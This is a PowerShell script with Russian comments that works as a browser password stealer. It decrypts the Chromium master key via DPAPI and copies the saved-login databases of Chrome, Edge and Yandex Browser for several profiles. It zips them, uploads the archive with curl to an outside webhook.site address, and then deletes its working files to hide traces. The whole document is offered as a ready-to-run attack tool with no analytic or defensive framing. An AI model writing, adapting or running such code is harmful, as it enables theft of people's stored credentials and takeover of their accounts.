# [ Настройки ]
$webhookUrl = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"
$workDir = "$env:TEMP\work_$(Get-Random)"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
$reportFile = "$workDir\keys.txt"

# Функция для сбора данных Chromium
function Get-BrowserData($path, $localStatePath, $name) {
    if (!(Test-Path $localStatePath)) { return }
    
    try {
        # 1. Извлекаем Master Key
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($localState.os_crypt.encrypted_key).Length-1)]
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        
        Add-Content $reportFile "--- $name ---"
        Add-Content $reportFile "Master Key: $([Convert]::ToBase64String($masterKey))`n"
        
        # 2. Копируем базу паролей
        if (Test-Path $path) {
            Copy-Item $path -Destination "$workDir\$name`_LoginData" -Force
        }
    } catch {
        Add-Content $reportFile "Ошибка в $name: $_"
    }
}

# Пути (проверка Default и Profile 1)
$browsers = @("Google\Chrome", "Microsoft\Edge", "Yandex\YandexBrowser")
foreach ($b in $browsers) {
    $basePath = "$env:LOCALAPPDATA\$b\User Data"
    $name = ($b -split '\\')[-1]
    
    # Проверяем стандартные папки профилей
    $profiles = @("Default", "Profile 1", "Profile 2")
    foreach ($p in $profiles) {
        $loginData = "$basePath\$p\Login Data"
        $localState = "$basePath\Local State"
        if (Test-Path $loginData) {
            Get-BrowserData $loginData $localState "$name`_$p"
        }
    }
}

# Упаковка и отправка
$zipFile = "$env:TEMP\data_$(Get-Random).zip"
if (Test-Path $workDir) {
    Compress-Archive -Path "$workDir\*" -DestinationPath $zipFile -Force
    
    # Отправка через встроенный curl
    & curl.exe -X POST -F "file=@$zipFile" $webhookUrl
    
    # Удаление следов
    Remove-Item -Recurse -Force $workDir
    Remove-Item -Force $zipFile
}
